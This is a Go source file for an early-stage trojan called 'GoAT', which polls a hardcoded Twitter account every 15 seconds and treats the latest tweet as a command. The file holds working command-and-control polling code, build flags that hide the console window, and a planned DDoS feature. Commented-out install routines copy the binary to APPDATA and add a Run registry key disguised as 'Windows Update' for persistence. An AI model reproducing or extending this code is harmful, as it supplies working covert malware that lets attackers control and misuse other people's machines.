/*	
GoAT (Golang Advanced Trojan) -- Version 0.1 (UNDER CONSTRUCTION!)
	by Peter Cunha
		http://petercunha.com
		https://github.com/petercunha

This is a trojan made in Go, using Twitter as a the C&C server. 

COMMANDS:
	!echo <message> - Logs message to slave console
	!quit - Closes GoAT
	!clear - Tells GoAT to do nothing. Use this command if you don't want slaves to execute latest command on connect.

NOTE: Compile with	go build -o GoAT.exe -ldflags "-H windowsgui" "C:\GoAT.go"	to have no console show.

TODO:
	- Persistence
	- Check for >1 running instance
	- Commands
		- DDoS
		- Send messagebox
		- Uninstall
		- Shutdown/Restart
*/ 

package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
	"command"
)

var (
	commander string = "loganj143"	// Twitter account for Command & Control
	slumber time.Duration = 15		// Time to wait between checking for commands (in seconds)
	cmd string = ""					// Latest command
)

func main() {
	fmt.Println("GoAT (Golang Advanced Trojan) Loaded.")

	for true {
		refresh()
		time.Sleep(time.Second * slumber)
	}
}

func refresh() {
	fmt.Println("\nRefreshing...")

	lines := getContent()
 	if lines == nil {
 		return
 	}

	for i := 0; i < len(lines); i++ {
		if strings.Contains(lines[i], "data-aria-label-part=\"0\">") {
			temp := strings.Split(strings.Split(lines[i], "data-aria-label-part=\"0\">")[1], "<")[0]
			if cmd != temp && !strings.Contains(temp, "!clear") {
				cmd = temp
				fmt.Println("New command found:", cmd)
				command.Parse(cmd)
			} else if strings.Contains(temp, "!clear") {
				cmd = "!clear"
			}

			i = len(lines)
		}
	}

	fmt.Println("Refreshed. Sleeping for", int(slumber), "seconds")
 } 

func getContent() (lines []string) {
	res, err := http.Get("https://twitter.com/" + commander)
	if err != nil {
		fmt.Println("Bad connection! Sleeping for", int(slumber), "seconds")
		return nil
	}

	content, err := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if err != nil {
		fmt.Println("Bad connection! Sleeping for", int(slumber), "seconds")
		return nil
	}

	return strings.Split(string(content), "\n")
}

// func install() {
// 	MyFile := os.Args[0]
// 	err := CopyFile(MyFile, os.Getenv("APPDATA") + "\\winupdt.exe")
// 	err = gowin.WriteStringReg("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update", "%APPDATA%" + "\\winupdt.exe")
// } 

// func uninstall() {
// 	err := gowin.DeleteKey("HKCU", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update")
// } 